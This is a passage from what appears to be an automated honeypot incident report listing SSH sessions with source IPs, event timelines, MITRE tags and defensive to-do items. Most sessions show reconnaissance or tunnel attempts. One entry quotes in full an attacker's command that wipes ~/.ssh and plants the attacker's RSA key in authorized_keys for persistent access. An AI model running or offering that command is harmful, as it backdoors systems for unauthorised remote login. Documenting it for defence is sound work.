| `2026-07-20 11:08:50` | `cowrie.command.input` |
| `2026-07-20 11:08:50` | `cowrie.log.closed` |
| `2026-07-20 11:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67f321d4811b

| Field | Detail |
|---|---|
| **Source IP** | `101.51.52[.]111` |
| **First Seen** | 2026-07-20 11:08 |
| **Last Seen** | 2026-07-20 11:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:08:55` | `cowrie.session.connect` |
| `2026-07-20 11:08:55` | `cowrie.client.version` |
| `2026-07-20 11:08:55` | `cowrie.client.kex` |
| `2026-07-20 11:08:57` | `cowrie.login.success` |
| `2026-07-20 11:08:58` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:09:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.51.52[.]111` to AbuseIPDB if not already reported
- [ ] Block `101.51.52[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299f17feb2ea

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-20 11:09 |
| **Last Seen** | 2026-07-20 11:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:09:08` | `cowrie.session.connect` |
| `2026-07-20 11:09:08` | `cowrie.client.version` |
| `2026-07-20 11:09:08` | `cowrie.client.kex` |
| `2026-07-20 11:09:11` | `cowrie.login.success` |
| `2026-07-20 11:09:12` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c75fce5ac1f

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:11 |
| **Last Seen** | 2026-07-20 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:11:32` | `cowrie.session.connect` |
| `2026-07-20 11:11:32` | `cowrie.client.version` |
| `2026-07-20 11:11:32` | `cowrie.client.kex` |
| `2026-07-20 11:11:33` | `cowrie.login.success` |
| `2026-07-20 11:11:34` | `cowrie.session.params` |
| `2026-07-20 11:11:34` | `cowrie.command.input` |
| `2026-07-20 11:11:34` | `cowrie.log.closed` |
| `2026-07-20 11:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57474cc4b8c6

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-20 11:12 |
| **Last Seen** | 2026-07-20 11:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:12:27` | `cowrie.session.connect` |
| `2026-07-20 11:12:27` | `cowrie.client.version` |
| `2026-07-20 11:12:27` | `cowrie.client.kex` |
| `2026-07-20 11:12:29` | `cowrie.login.success` |
| `2026-07-20 11:12:30` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b973009edd6

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:14 |
| **Last Seen** | 2026-07-20 11:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:14:16` | `cowrie.session.connect` |
| `2026-07-20 11:14:16` | `cowrie.client.version` |
| `2026-07-20 11:14:16` | `cowrie.client.kex` |
| `2026-07-20 11:14:17` | `cowrie.login.success` |
| `2026-07-20 11:14:18` | `cowrie.session.params` |
| `2026-07-20 11:14:18` | `cowrie.command.input` |
| `2026-07-20 11:14:18` | `cowrie.log.closed` |
| `2026-07-20 11:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-809dc1c242da

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:16 |
| **Last Seen** | 2026-07-20 11:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:16:59` | `cowrie.session.connect` |
| `2026-07-20 11:16:59` | `cowrie.client.version` |
| `2026-07-20 11:17:00` | `cowrie.client.kex` |
| `2026-07-20 11:17:00` | `cowrie.login.success` |
| `2026-07-20 11:17:01` | `cowrie.session.params` |
| `2026-07-20 11:17:01` | `cowrie.command.input` |
| `2026-07-20 11:17:01` | `cowrie.log.closed` |
| `2026-07-20 11:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e18cdf34f99e

| Field | Detail |
|---|---|
| **Source IP** | `60.12.5[.]190` |
| **First Seen** | 2026-07-20 11:18 |
| **Last Seen** | 2026-07-20 11:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:18:56` | `cowrie.session.connect` |
| `2026-07-20 11:18:57` | `cowrie.client.version` |
| `2026-07-20 11:18:57` | `cowrie.client.kex` |
| `2026-07-20 11:18:59` | `cowrie.login.success` |
| `2026-07-20 11:19:00` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.12.5[.]190` to AbuseIPDB if not already reported
- [ ] Block `60.12.5[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2fb2be65557

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:19 |
| **Last Seen** | 2026-07-20 11:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:19:32` | `cowrie.session.connect` |
| `2026-07-20 11:19:32` | `cowrie.client.version` |
| `2026-07-20 11:19:33` | `cowrie.client.kex` |
| `2026-07-20 11:19:33` | `cowrie.login.success` |
| `2026-07-20 11:19:34` | `cowrie.session.params` |
| `2026-07-20 11:19:34` | `cowrie.command.input` |
| `2026-07-20 11:19:34` | `cowrie.log.closed` |
| `2026-07-20 11:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-652dcd603481

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:22 |
| **Last Seen** | 2026-07-20 11:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:22:10` | `cowrie.session.connect` |
| `2026-07-20 11:22:10` | `cowrie.client.version` |
| `2026-07-20 11:22:10` | `cowrie.client.kex` |
| `2026-07-20 11:22:11` | `cowrie.login.success` |
| `2026-07-20 11:22:12` | `cowrie.session.params` |
| `2026-07-20 11:22:12` | `cowrie.command.input` |
| `2026-07-20 11:22:12` | `cowrie.log.closed` |
| `2026-07-20 11:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09acec88131f

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:24 |
| **Last Seen** | 2026-07-20 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:24:48` | `cowrie.session.connect` |
| `2026-07-20 11:24:48` | `cowrie.client.version` |
| `2026-07-20 11:24:48` | `cowrie.client.kex` |
| `2026-07-20 11:24:49` | `cowrie.login.success` |
| `2026-07-20 11:24:50` | `cowrie.session.params` |
| `2026-07-20 11:24:50` | `cowrie.command.input` |
| `2026-07-20 11:24:50` | `cowrie.log.closed` |
| `2026-07-20 11:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4217dc5f7c64

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-07-20 11:26 |
| **Last Seen** | 2026-07-20 11:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:26:46` | `cowrie.session.connect` |
| `2026-07-20 11:26:46` | `cowrie.client.version` |
| `2026-07-20 11:26:47` | `cowrie.client.kex` |
| `2026-07-20 11:26:47` | `cowrie.login.success` |
| `2026-07-20 11:26:48` | `cowrie.session.params` |
| `2026-07-20 11:26:48` | `cowrie.command.input` |
| `2026-07-20 11:26:48` | `cowrie.command.failed` |
| `2026-07-20 11:26:48` | `cowrie.log.closed` |
| `2026-07-20 11:26:49` | `cowrie.session.params` |
| `2026-07-20 11:26:49` | `cowrie.command.input` |
| `2026-07-20 11:26:49` | `cowrie.session.file_download` |
| `2026-07-20 11:26:49` | `cowrie.log.closed` |
| `2026-07-20 11:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c19e7fa286a

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-07-20 11:26 |
| **Last Seen** | 2026-07-20 11:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:26:49` | `cowrie.session.connect` |
| `2026-07-20 11:26:49` | `cowrie.client.version` |
| `2026-07-20 11:26:49` | `cowrie.client.kex` |
| `2026-07-20 11:26:50` | `cowrie.login.success` |
| `2026-07-20 11:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd96231676ed

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-07-20 11:26 |
| **Last Seen** | 2026-07-20 11:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:26:50` | `cowrie.session.connect` |
| `2026-07-20 11:26:50` | `cowrie.client.version` |
| `2026-07-20 11:26:50` | `cowrie.client.kex` |
| `2026-07-20 11:26:51` | `cowrie.login.success` |
| `2026-07-20 11:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9508f6aa64ca

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:27 |
| **Last Seen** | 2026-07-20 11:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:27:33` | `cowrie.session.connect` |
| `2026-07-20 11:27:33` | `cowrie.client.version` |
| `2026-07-20 11:27:33` | `cowrie.client.kex` |
| `2026-07-20 11:27:34` | `cowrie.login.success` |
| `2026-07-20 11:27:35` | `cowrie.session.params` |
| `2026-07-20 11:27:35` | `cowrie.command.input` |
| `2026-07-20 11:27:35` | `cowrie.log.closed` |
| `2026-07-20 11:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e481eb1faddc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-20 11:29 |
| **Last Seen** | 2026-07-20 11:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:29:49` | `cowrie.session.connect` |
| `2026-07-20 11:29:49` | `cowrie.client.version` |
| `2026-07-20 11:29:49` | `cowrie.client.kex` |
| `2026-07-20 11:29:50` | `cowrie.login.success` |
| `2026-07-20 11:29:50` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:29:50` | `cowrie.direct-tcpip.data` |
| `2026-07-20 11:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4934da100d3

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-20 11:30 |
| **Last Seen** | 2026-07-20 11:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:30:03` | `cowrie.session.connect` |
| `2026-07-20 11:30:03` | `cowrie.client.version` |
| `2026-07-20 11:30:03` | `cowrie.client.kex` |
| `2026-07-20 11:30:05` | `cowrie.login.success` |
| `2026-07-20 11:30:05` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3624471b0433

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:30 |
| **Last Seen** | 2026-07-20 11:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:30:19` | `cowrie.session.connect` |
| `2026-07-20 11:30:19` | `cowrie.client.version` |
| `2026-07-20 11:30:19` | `cowrie.client.kex` |
| `2026-07-20 11:30:20` | `cowrie.login.success` |
| `2026-07-20 11:30:21` | `cowrie.session.params` |
| `2026-07-20 11:30:21` | `cowrie.command.input` |
| `2026-07-20 11:30:21` | `cowrie.log.closed` |
| `2026-07-20 11:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d217f53c54

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:32 |
| **Last Seen** | 2026-07-20 11:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:32:56` | `cowrie.session.connect` |
| `2026-07-20 11:32:56` | `cowrie.client.version` |
| `2026-07-20 11:32:57` | `cowrie.client.kex` |
| `2026-07-20 11:32:58` | `cowrie.login.success` |
| `2026-07-20 11:32:59` | `cowrie.session.params` |
| `2026-07-20 11:32:59` | `cowrie.command.input` |
| `2026-07-20 11:32:59` | `cowrie.log.closed` |
| `2026-07-20 11:32:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123d8b3a1888

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:35 |
| **Last Seen** | 2026-07-20 11:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:35:34` | `cowrie.session.connect` |
| `2026-07-20 11:35:34` | `cowrie.client.version` |
| `2026-07-20 11:35:35` | `cowrie.client.kex` |
| `2026-07-20 11:35:35` | `cowrie.login.success` |
| `2026-07-20 11:35:36` | `cowrie.session.params` |
| `2026-07-20 11:35:36` | `cowrie.command.input` |
| `2026-07-20 11:35:37` | `cowrie.log.closed` |
| `2026-07-20 11:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a140601852

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-20 11:36 |
| **Last Seen** | 2026-07-20 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:36:28` | `cowrie.session.connect` |
| `2026-07-20 11:36:28` | `cowrie.client.version` |
| `2026-07-20 11:36:28` | `cowrie.client.kex` |
| `2026-07-20 11:36:28` | `cowrie.login.success` |
| `2026-07-20 11:36:29` | `cowrie.session.params` |
| `2026-07-20 11:36:29` | `cowrie.command.input` |
| `2026-07-20 11:36:29` | `cowrie.log.closed` |
| `2026-07-20 11:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-025f4481501d

| Field | Detail |
|---|---|
| **Source IP** | `123.212.9[.]122` |
| **First Seen** | 2026-07-20 11:37 |
| **Last Seen** | 2026-07-20 11:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:37:12` | `cowrie.session.connect` |
| `2026-07-20 11:37:13` | `cowrie.client.version` |
| `2026-07-20 11:37:13` | `cowrie.client.kex` |
| `2026-07-20 11:37:15` | `cowrie.login.success` |
| `2026-07-20 11:37:15` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.212.9[.]122` to AbuseIPDB if not already reported
- [ ] Block `123.212.9[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3747c0fa882

| Field | Detail |
|---|---|
| **Source IP** | `182.225.134[.]13` |
| **First Seen** | 2026-07-20 11:37 |
| **Last Seen** | 2026-07-20 11:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:37:20` | `cowrie.session.connect` |
| `2026-07-20 11:37:21` | `cowrie.client.version` |
| `2026-07-20 11:37:21` | `cowrie.client.kex` |
| `2026-07-20 11:37:23` | `cowrie.login.success` |
| `2026-07-20 11:37:24` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.225.134[.]13` to AbuseIPDB if not already reported
- [ ] Block `182.225.134[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c89ec463f2e

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:38 |
| **Last Seen** | 2026-07-20 11:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:38:09` | `cowrie.session.connect` |
| `2026-07-20 11:38:09` | `cowrie.client.version` |
| `2026-07-20 11:38:09` | `cowrie.client.kex` |
| `2026-07-20 11:38:10` | `cowrie.login.success` |
| `2026-07-20 11:38:11` | `cowrie.session.params` |
| `2026-07-20 11:38:11` | `cowrie.command.input` |
| `2026-07-20 11:38:11` | `cowrie.log.closed` |
| `2026-07-20 11:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9e92fd172be

| Field | Detail |
|---|---|
| **Source IP** | `185.81.94[.]58` |
| **First Seen** | 2026-07-20 11:39 |
| **Last Seen** | 2026-07-20 11:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:39:02` | `cowrie.session.connect` |
| `2026-07-20 11:39:03` | `cowrie.client.version` |
| `2026-07-20 11:39:03` | `cowrie.client.kex` |
| `2026-07-20 11:39:04` | `cowrie.login.success` |
| `2026-07-20 11:39:04` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.81.94[.]58` to AbuseIPDB if not already reported
- [ ] Block `185.81.94[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f2b33af318

| Field | Detail |
|---|---|
| **Source IP** | `114.96.79[.]13` |
| **First Seen** | 2026-07-20 11:39 |
| **Last Seen** | 2026-07-20 11:40 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
